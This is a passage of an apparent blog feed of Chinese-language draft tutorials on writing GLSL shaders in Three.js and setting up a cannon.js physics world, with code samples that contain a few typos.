      <content type="html"><![CDATA[<blockquote><p>着色器是一种使用<em><code>GLSL</code></em>语言编写的运行在<em><code>GPU</code></em>上的程序。是屏幕上呈现画面前的最后一步，用它可以实现对先前渲染结果进行修改（如颜色、位置），从而实现高级的渲染效果。在 <code>Three.js</code> 中，需要使用 <code>GLSL</code> 语言来编写着色器，全称是 <code>OpenGL Shading Language</code>，意为 <code>OpenGL</code> 中的着色语言。</p></blockquote><h3 id="1-变量数据类型"><a href="#1-变量数据类型" class="headerlink" title="1. 变量数据类型"></a>1. 变量数据类型</h3><ul><li><code>float</code> 浮点数</li><li><code>int</code> 整数</li><li><code>bool</code> 布尔值</li><li><code>vec2</code> 二维向量</li><li><code>vec3</code> 三维向量</li><li><code>vec4</code> 四维向量</li><li><code>mat3</code></li><li><code>mat4</code></li><li><code>sampler2D</code></li><li><code>samplerCube</code></li></ul><p><em><code>vec</code></em>向量类型，可以分别看成由 <code>(x,y)</code>、<code>(x,y,z)</code>或<code>(r,g,b)</code>、<code>(x,y,z,w)</code>或(<code>r,g,b,a)</code> 等分量组成，vec3 可以由 vec2+float 创建、vec4 可以由 vec3+float、vec2+vec2 等不同方式创建，比较灵活。</p><p>GLSL 里 rgb 范围都是 0.0-1.0，而非一般的 0-255。黑色为<code>(0.0,0.0,0.0)</code>、白色为<code>(1.0,1.0,1.0)</code>、红色为<code>(1.0,0.0,0.0)</code>。<br>如果设置的颜色值小于0.0会被截取到0.0，大于1.0会被截取到1.0。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">float alpha = <span class="number">0.5</span>;</span><br><span class="line">int num = <span class="number">10</span>;</span><br><span class="line">bool flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line"><span class="comment">// a.x=1.0 a.y=0.0</span></span><br><span class="line">a.x = <span class="number">2.0</span>;</span><br><span class="line">a.y = <span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>);</span><br><span class="line"><span class="comment">// a.x=1.0 a.y=1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量之间或向量与浮点数之间的加减乘除四则运算是基于每个分量单独计算</span></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>) + vec2(<span class="number">0.1</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="comment">// a.x=1.1 a.y=1.2</span></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>) * <span class="number">2.0</span>;</span><br><span class="line"><span class="comment">// a.x=2.0 a.y=2.0</span></span><br><span class="line"></span><br><span class="line">vec3 b = vec3(<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">0.0</span>);</span><br><span class="line"><span class="comment">// b.x=1.0 b.y=2.0 b.z=0.0</span></span><br><span class="line"><span class="comment">// b.r=1.0 b.g=2.0 b.b=0.0</span></span><br><span class="line">b.z = <span class="number">3.0</span>;</span><br><span class="line"></span><br><span class="line">vec4 c = vec4(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line"><span class="comment">// c.x=c.y=c.z=c.w=1.0</span></span><br><span class="line"><span class="comment">// c.r=c.g=c.b=c.a=1.0</span></span><br><span class="line">c.r = <span class="number">0.9</span></span><br><span class="line">c.g = <span class="number">0.0</span>;</span><br><span class="line">c.b = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">vec3 d = vec3(vec2(<span class="number">0.5</span>), <span class="number">1.0</span>);</span><br><span class="line">vec4 e = vec4(vec3(<span class="number">1.0</span>), <span class="number">1.0</span>);</span><br><span class="line">vec4 e = vec4(vec2(<span class="number">0.3</span>), vec2(<span class="number">0.1</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-修饰符"><a href="#2-修饰符" class="headerlink" title="2. 修饰符"></a>2. 修饰符</h3><p>GLSL约定俗成地将 <code>attribute</code>变量用<code>a</code>开头如<code>aRadom</code>，<code>uniform</code>的用<code>u</code>开头如<code>uTime</code>，<code>varying</code>的用<code>v</code>开头如<code>vUv</code>.</p><h4 id="2-1-attribute-顶点相关值"><a href="#2-1-attribute-顶点相关值" class="headerlink" title="2.1 attribute 顶点相关值"></a>2.1 attribute 顶点相关值</h4><p><code>attributes</code> 修饰符表明这个数据在每个顶点上都不同。内置的attribute有</p><ul><li><code>attribute vec3 position</code> 顶点坐标</li><li><code>attribute vec3 normal</code> 法线向量</li><li><code>attribute vec2 uv</code>  纹理坐标</li><li><code>attribute float aRandom</code> 每个顶点不同的随机值</li></ul><h4 id="2-2-uniform-统一值"><a href="#2-2-uniform-统一值" class="headerlink" title="2.2 uniform 统一值"></a>2.2 uniform 统一值</h4><p><code>uniform</code>修饰符，表示所有线程都传入的、统一的值。内置的uniforms</p><ul><li><code>uniform mat4 modelMatrix</code></li><li><code>uniform mat4 modelViewMatrix</code></li><li><code>uniform mat4 projectionMatrix</code></li><li><code>uniform mat4 viewMatrix</code></li><li><code>uniform mat3 normalMatrix</code></li><li><code>uniform vec3 cameraPosition</code></li></ul><h4 id="2-3-varying-传递值"><a href="#2-3-varying-传递值" class="headerlink" title="2.3 varying 传递值"></a>2.3 varying 传递值</h4><p>如果顶点着色器的变量想在片元着色器里使用，就需要借助<code>varying</code>来传递。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vertex shader</span></span><br><span class="line">attribute vec2 uv;</span><br><span class="line">varing vec2 vUv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  vUv = uv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fragment Shader</span></span><br><span class="line">varying vec2 vUV;</span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  gl_FragColor = vec4(vUv, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-内置函数"><a href="#3-内置函数" class="headerlink" title="3. 内置函数"></a>3. 内置函数</h3><h4 id="3-1-运算函数"><a href="#3-1-运算函数" class="headerlink" title="3.1 运算函数"></a>3.1 运算函数</h4><ul><li><em><code>abs(x)</code></em>：取 x 的绝对值</li><li><em><code>radians(x)</code></em>：角度转弧度（弧度是圆的半径和圆心角所对应的弧长之比）</li><li><em><code>degrees(x)</code></em>：弧度转角度</li><li><em><code>sin(x)</code></em>：正弦函数，传入值为弧度。还有 cos 余弦函数、tan 正切函数、asin 反正弦、acos反余弦、atan 反正切等</li><li><em><code>pow(x,y)</code></em>：x^y</li><li><em><code>exp(x)</code></em>：e^x</li><li><em><code>exp2(x)</code></em>：2^x</li><li><em><code>log(x)</code></em>：logex</li><li><em><code>log2(x)</code></em>：log2x</li><li><em><code>sqrt(x)</code></em>：x√，根号x</li><li><em><code>inversesqr(x)</code></em>：1 / x√ , 根号x的倒数</li><li><em><code>sign(x)</code></em>：x&gt;0 返回 1.0，x&lt;0 返回 -1.0，否则返回 0.0</li><li><em><code>ceil(x)</code></em>：返回大于或者等于 x 的整数</li><li><em><code>floor(x)</code></em>：返回小于或者等于 x 的整数</li><li><em><code>fract(x)</code></em>：返回 x-floor(x) 的值</li><li><em><code>mod(x,y)</code></em>：取x除以y的余数</li><li><em><code>min(x,y)</code></em>：获取 x、y 中小的那个</li><li><em><code>max(x,y)</code></em>：获取 x、y 中大的那个</li><li><em><code>dFdx(p)</code></em>：p 在 x 方向上的偏导数</li><li><em><code>dFdy(p)</code></em>：p 在 y 方向上的偏导数</li><li><em><code>fwidth(p)</code></em>：p 在 x 和 y 方向上的偏导数的绝对值之和</li><li><em><code>step(x, a)</code></em>：x &lt; a返回 0.0，否则返回 1.0。常用于生成阶梯效果</li><li><em><code>smoothstep(t1, t2, x)</code></em>: 在t1到t2之间平滑过度，小于t1时返回0，大于t2时返回1。常用于实现颜色渐变、物体平滑移动</li><li><em><code>mix(colorA, colorB, a)</code></em>：返回<code>colorA * (1−a) + colorB * a</code>。 颜色函数，常用于混合colorA和colorB, a是混合系数，范围为0到1。当a为0时，混合后的值等于x；当a为1时，混合后的值等于y；当a在0到1之间时，混合后的值是x和y的线性插值。实现颜色渐变、透明度混合<br><br></li></ul><h4 id="3-2-几何函数"><a href="#3-2-几何函数" class="headerlink" title="3.2 几何函数"></a>3.2 几何函数</h4><ul><li><em><code>length(vec2 p)</code></em>: 计算向量的长度</li><li><em><code>distance(vec2 p0, vec2 p1)</code></em>: 计算两向量之间的距离</li><li><em><code>dot(vec2 x, vec2 y)</code></em>: 计算两个向量的点积</li><li><em><code>cross(x,y)</code></em>：返回向量 xy 的差积</li><li><em><code>normalize(x)</code></em>：返回与 x 向量方向相同，长度为 1 的向量</li></ul><p><br></p><h4 id="3-3-noise噪声"><a href="#3-3-noise噪声" class="headerlink" title="3.3 noise噪声"></a>3.3 noise噪声</h4><p>noise 函数能使相邻的点（一维、二维、三维的点都行）产生相近的数值，而不是 random 随机函数那种每个位置的数值都和附近无关的效果。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Classic Perlin 3D Noise </span></span><br><span class="line"><span class="comment">//by Stefan Gustavson</span></span><br><span class="line">vec4 permute(vec4 x)&#123;<span class="keyword">return</span> mod(((x*<span class="number">34.0</span>)+<span class="number">1.0</span>)*x, <span class="number">289.0</span>);&#125;</span><br><span class="line">vec4 taylorInvSqrt(vec4 r)&#123;<span class="keyword">return</span> <span class="number">1.79284291400159</span> - <span class="number">0.85373472095314</span> * r;&#125;</span><br><span class="line">vec3 fade(vec3 t) &#123;<span class="keyword">return</span> t*t*t*(t*(t*<span class="number">6.0</span><span class="number">-15.0</span>)+<span class="number">10.0</span>);&#125;</span><br><span class="line"></span><br><span class="line">float cnoise(vec3 P)&#123;</span><br><span class="line">  vec3 Pi0 = floor(P); <span class="comment">// Integer part for indexing</span></span><br><span class="line">  vec3 Pi1 = Pi0 + vec3(<span class="number">1.0</span>); <span class="comment">// Integer part + 1</span></span><br><span class="line">  Pi0 = mod(Pi0, <span class="number">289.0</span>);</span><br><span class="line">  Pi1 = mod(Pi1, <span class="number">289.0</span>);</span><br><span class="line">  vec3 Pf0 = fract(P); <span class="comment">// Fractional part for interpolation</span></span><br><span class="line">  vec3 Pf1 = Pf0 - vec3(<span class="number">1.0</span>); <span class="comment">// Fractional part - 1.0</span></span><br><span class="line">  vec4 ix = vec4(Pi0.x, Pi1.x, Pi0.x, Pi1.x);</span><br><span class="line">  vec4 iy = vec4(Pi0.yy, Pi1.yy);</span><br><span class="line">  vec4 iz0 = Pi0.zzzz;</span><br><span class="line">  vec4 iz1 = Pi1.zzzz;</span><br><span class="line"></span><br><span class="line">  vec4 ixy = permute(permute(ix) + iy);</span><br><span class="line">  vec4 ixy0 = permute(ixy + iz0);</span><br><span class="line">  vec4 ixy1 = permute(ixy + iz1);</span><br><span class="line"></span><br><span class="line">  vec4 gx0 = ixy0 / <span class="number">7.0</span>;</span><br><span class="line">  vec4 gy0 = fract(floor(gx0) / <span class="number">7.0</span>) - <span class="number">0.5</span>;</span><br><span class="line">  gx0 = fract(gx0);</span><br><span class="line">  vec4 gz0 = vec4(<span class="number">0.5</span>) - abs(gx0) - abs(gy0);</span><br><span class="line">  vec4 sz0 = step(gz0, vec4(<span class="number">0.0</span>));</span><br><span class="line">  gx0 -= sz0 * (step(<span class="number">0.0</span>, gx0) - <span class="number">0.5</span>);</span><br><span class="line">  gy0 -= sz0 * (step(<span class="number">0.0</span>, gy0) - <span class="number">0.5</span>);</span><br><span class="line"></span><br><span class="line">  vec4 gx1 = ixy1 / <span class="number">7.0</span>;</span><br><span class="line">  vec4 gy1 = fract(floor(gx1) / <span class="number">7.0</span>) - <span class="number">0.5</span>;</span><br><span class="line">  gx1 = fract(gx1);</span><br><span class="line">  vec4 gz1 = vec4(<span class="number">0.5</span>) - abs(gx1) - abs(gy1);</span><br><span class="line">  vec4 sz1 = step(gz1, vec4(<span class="number">0.0</span>));</span><br><span class="line">  gx1 -= sz1 * (step(<span class="number">0.0</span>, gx1) - <span class="number">0.5</span>);</span><br><span class="line">  gy1 -= sz1 * (step(<span class="number">0.0</span>, gy1) - <span class="number">0.5</span>);</span><br><span class="line"></span><br><span class="line">  vec3 g000 = vec3(gx0.x,gy0.x,gz0.x);</span><br><span class="line">  vec3 g100 = vec3(gx0.y,gy0.y,gz0.y);</span><br><span class="line">  vec3 g010 = vec3(gx0.z,gy0.z,gz0.z);</span><br><span class="line">  vec3 g110 = vec3(gx0.w,gy0.w,gz0.w);</span><br><span class="line">  vec3 g001 = vec3(gx1.x,gy1.x,gz1.x);</span><br><span class="line">  vec3 g101 = vec3(gx1.y,gy1.y,gz1.y);</span><br><span class="line">  vec3 g011 = vec3(gx1.z,gy1.z,gz1.z);</span><br><span class="line">  vec3 g111 = vec3(gx1.w,gy1.w,gz1.w);</span><br><span class="line"></span><br><span class="line">  vec4 norm0 = taylorInvSqrt(vec4(dot(g000, g000), dot(g010, g010), dot(g100, g100), dot(g110, g110)));</span><br><span class="line">  g000 *= norm0.x;</span><br><span class="line">  g010 *= norm0.y;</span><br><span class="line">  g100 *= norm0.z;</span><br><span class="line">  g110 *= norm0.w;</span><br><span class="line">  vec4 norm1 = taylorInvSqrt(vec4(dot(g001, g001), dot(g011, g011), dot(g101, g101), dot(g111, g111)));</span><br><span class="line">  g001 *= norm1.x;</span><br><span class="line">  g011 *= norm1.y;</span><br><span class="line">  g101 *= norm1.z;</span><br><span class="line">  g111 *= norm1.w;</span><br><span class="line"></span><br><span class="line">  float n000 = dot(g000, Pf0);</span><br><span class="line">  float n100 = dot(g100, vec3(Pf1.x, Pf0.yz));</span><br><span class="line">  float n010 = dot(g010, vec3(Pf0.x, Pf1.y, Pf0.z));</span><br><span class="line">  float n110 = dot(g110, vec3(Pf1.xy, Pf0.z));</span><br><span class="line">  float n001 = dot(g001, vec3(Pf0.xy, Pf1.z));</span><br><span class="line">  float n101 = dot(g101, vec3(Pf1.x, Pf0.y, Pf1.z));</span><br><span class="line">  float n011 = dot(g011, vec3(Pf0.x, Pf1.yz));</span><br><span class="line">  float n111 = dot(g111, Pf1);</span><br><span class="line"></span><br><span class="line">  vec3 fade_xyz = fade(Pf0);</span><br><span class="line">  vec4 n_z = mix(vec4(n000, n100, n010, n110), vec4(n001, n101, n011, n111), fade_xyz.z);</span><br><span class="line">  vec2 n_yz = mix(n_z.xy, n_z.zw, fade_xyz.y);</span><br><span class="line">  float n_xyz = mix(n_yz.x, n_yz.y, fade_xyz.x); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">2.2</span> * n_xyz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://thebookofshaders.com/" target="_blank" rel="noopener">The Books of Shaders</a></li><li><a href="https://juejin.cn/post/7158032481302609950" target="_blank" rel="noopener">Three.js 进阶之旅：Shader着色器入门</a></li><li><a href="">更多GLSL内置函数</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shader</title>
      <link href="/2024/12/02/threejs-Shader/"/>
      <url>/2024/12/02/threejs-Shader/</url>
      <content type="html"><![CDATA[<h3 id="1-点线面体"><a href="#1-点线面体" class="headerlink" title="1. 点线面体"></a>1. 点线面体</h3><p>我们绘制一个宽高<code>1*1</code>的平面，开启线框模式 <em><code>wireframe: true</code></em>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.PlaneGeometry(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123;</span><br><span class="line">    color: <span class="number">0x0ca678</span>,</span><br><span class="line">    wireframe: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh(geometry, material);</span><br><span class="line">scene.add(mesh);</span><br></pre></td></tr></table></figure></p><p>你会发现默认的平面由4个顶点，2个三角形组成。<br>顶点连成线、线组成三角形、三角形组成几何体，立方体、球体等亦是如此。</p><p><img src="/2024/12/02/threejs-Shader/1.jpg" style="max-width:250px"></p><p>打印几何体 <em><code>console.log(geometry)</code></em><br><img src="/2024/12/02/threejs-Shader/2.jpg" style="max-width:500px"></p><p>可以看到attributes携带的每个顶点的数据，里面包含</p><h4 id="1-1-position"><a href="#1-1-position" class="headerlink" title="1.1 position"></a>1.1 <code>position</code></h4><p>顶点坐标<br><img src="/2024/12/02/threejs-Shader/3.jpg" style="max-width:500px"><br><br></p><h4 id="1-2-uv-纹理坐标"><a href="#1-2-uv-纹理坐标" class="headerlink" title="1.2 uv 纹理坐标"></a>1.2 <code>uv</code> 纹理坐标</h4><p>u从左到右增加，v从下到上增加，范围是左下角(0,0)到右上角(1,1)，借助uv就能把纹理图片贴到3D物体上。<code>uv</code>是每个片元的数值，左下角 vUv 为 (0.0, 0.0) 所以对应的 vUv.x=vUv.y=0.0。同理左上角就是 (0.0, 1.0)、右下角 (1.0, 0.0)、右上角 (1.0, 1.0)、最中间 (0.5, 0.5)。</p><p><img src="/2024/12/02/threejs-Shader/4.jpg" style="max-width:500px"></p><p>可以看到立方体每个面都有各自的 (0,0)-(1,1) uv 值。<br><img src="/2024/12/02/threejs-Shader/5.jpg" style="max-width:500px"></p><h4 id="1-3-normal"><a href="#1-3-normal" class="headerlink" title="1.3 normal"></a>1.3 <code>normal</code></h4><h3 id="2-ShaderMaterial"><a href="#2-ShaderMaterial" class="headerlink" title="2. ShaderMaterial"></a>2. ShaderMaterial</h3><p>使用<code>ShaderMaterial</code>来创建几何体, 并通过设置<code>vertexShader</code> 和 <code>fragmentShader</code>来实现自定义shader材质，由<code>GPU</code>分别对每个顶点、每个片元独立执行，并且每个顶点或片元都不知道其他顶点或片元的数据。<br>在顶点着色器里需要设置<code>gl_Position</code>,<code>gl_PointSize(可选)</code> 顶点位置，在片元着色器里需要设置<code>gl_FragColor</code>片元/像素颜色。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vertex = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fragment = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.ShaderMaterial(&#123;</span><br><span class="line">  vertexShader: vertex,</span><br><span class="line">  fragmentShader: fragment</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="2-1-VertexShader-顶点着色器"><a href="#2-1-VertexShader-顶点着色器" class="headerlink" title="2.1 VertexShader 顶点着色器"></a>2.1 VertexShader 顶点着色器</h4><p>Vertex Shader 用于定位几何体的顶点，它的工作原理是发送顶点位置、网格变换（position、旋rotation和 scale等）、摄像机信息（position、rotation、fov 等）, GPU 将按照 Vertex Shader 中的指令处理这些信息，然后将顶点投影到 2D 空间中渲染成 Canvas。</p><p>最简单的顶点着色器也要设置这一串东西，以确保三维空间的物体呈现在二维屏幕上。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vertex = <span class="string">`</span></span><br><span class="line"><span class="string">  void main() &#123;</span></span><br><span class="line"><span class="string">    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure></p><p><strong>如何理解这一行代码？</strong><br>将顶点坐标<code>position</code>变成<code>vec4</code>四维向量，<code>* modelMatrix</code>将模型原本坐标变成世界坐标里适当的位置和大小，实现想要的场景；再<code>* viewMatrix</code>视图矩阵实现物体相基于相机的位置，这两步可以简写为<code>modelViewMatrix</code>，最后再<code>* projectionMatrix</code>变换到裁剪空间，变成二维屏幕上渲染的效果。</p><p>这里的变量<code>modelViewMatrix</code>, <code>projectionMatrix</code>, <code>position</code>都是<code>shaderMatrial</code>内置可以直接拿来用的。<code>uv</code>, <code>normal</code>则可以在顶点着色器里直接使用。</p><h4 id="2-3-FragmentShader-片元着色器"><a href="#2-3-FragmentShader-片元着色器" class="headerlink" title="2.3 FragmentShader 片元着色器"></a>2.3 FragmentShader 片元着色器</h4><p>Fragment Shader 在 Vertex Shader 之后执行，它的作用是为几何体的每个可见像素进行着色。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/7233359844974182437" target="_blank" rel="noopener">手把手带你入门 Three.js Shader 系列（一）</a></li><li><a href="https://juejin.cn/post/7158032481302609950" target="_blank" rel="noopener">Three.js 进阶之旅：Shader着色器入门</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CANNON.js物理世界</title>
      <link href="/2024/12/02/threejs-cannon/"/>
      <url>/2024/12/02/threejs-cannon/</url>
      <content type="html"><![CDATA[<p><code>cannon.js</code> 3d物理引擎,</p><ul><li>官网：<a href="https://schteppe.github.io/cannon.js/" target="_blank" rel="noopener">https://schteppe.github.io/cannon.js/</a></li></ul><h3 id="1-World-物理世界"><a href="#1-World-物理世界" class="headerlink" title="1. World 物理世界"></a>1. World 物理世界</h3><ul><li>new CANNON.World() 建立物理世界</li><li>world.broadphase 设置默认检测碰撞方式</li><li>world.allowSleep </li><li>world.gravity.set(0, -9.82, 0)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> CANNON <span class="keyword">from</span> <span class="string">'cannon-es'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个重力为-9.82 m²/s 的物理世界</span></span><br><span class="line"><span class="keyword">const</span> world = <span class="keyword">new</span> CANNNON.World()</span><br><span class="line">word.broadphase = <span class="keyword">new</span> CANNON.SAPBroadphase(world)</span><br><span class="line">world.allowSleep = <span class="literal">true</span></span><br><span class="line">world.gravity.set(<span class="number">0</span>, - <span class="number">9.82</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-Body-物体"><a href="#2-Body-物体" class="headerlink" title="2. Body 物体"></a>2. Body 物体</h3><ul><li>建立物体<ul><li>new CANNON.Body()<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectsToUpdate = [] <span class="comment">// 存储需要更新的物理对象和对应的three.js对象</span></span><br><span class="line"><span class="keyword">const</span> sphereGeometry = <span class="keyword">new</span> THREE.SphereGeometry(<span class="number">1</span>, <span class="number">20</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">const</span> sphereMaterial = <span class="keyword">new</span> THREE.MeshStandardMaterial(&#123;</span><br><span class="line">    metalness: <span class="number">0.3</span>,</span><br><span class="line">    roughness: <span class="number">0.4</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> createSphere = <span class="function">(<span class="params">radius, position</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh(sphereGeometry, sphereMaterial)</span><br><span class="line">  mesh.castShadow = <span class="literal">true</span></span><br><span class="line">  mesh.scale.set(radius, radius, radius)</span><br><span class="line">  mesh.position.copy(position)</span><br><span class="line">  scene.add(mesh)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// cannon.js body</span></span><br><span class="line">  <span class="keyword">const</span> shape = <span class="keyword">new</span> CANNON.Sphere(radius)</span><br><span class="line">  <span class="keyword">const</span> body = <span class="keyword">new</span> CANNON.Body(&#123;</span><br><span class="line">    mass: <span class="number">1</span>,</span><br><span class="line">    position: <span class="keyword">new</span> CANNON.Vec3(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>),</span><br><span class="line">    shape,</span><br><span class="line">    material: defaultMaterial</span><br><span class="line">  &#125;)</span><br><span class="line">  body.position.copy(position)</span><br><span class="line">  world.addBody(body)</span><br><span class="line">  objectsToUpdate.push(&#123; mesh, body &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="3-地板"><a href="#3-地板" class="headerlink" title="3. 地板"></a>3. 地板</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个质量为0的地板，形状为平面，添加到物理世界</span></span><br><span class="line"><span class="keyword">const</span> floorShape = <span class="keyword">new</span> CANNON.Plane()</span><br><span class="line"><span class="keyword">const</span> floorBody = <span class="keyword">new</span> CANNON.Body()</span><br><span class="line">floorBody.mass = <span class="number">0</span></span><br><span class="line">floorBody.addShape(floorShape)</span><br><span class="line">floorBody.quaternion.setFromAxisAngle(<span class="keyword">new</span> CANNON.Vec3(- <span class="number">1</span>, <span class="number">0</span>, <span 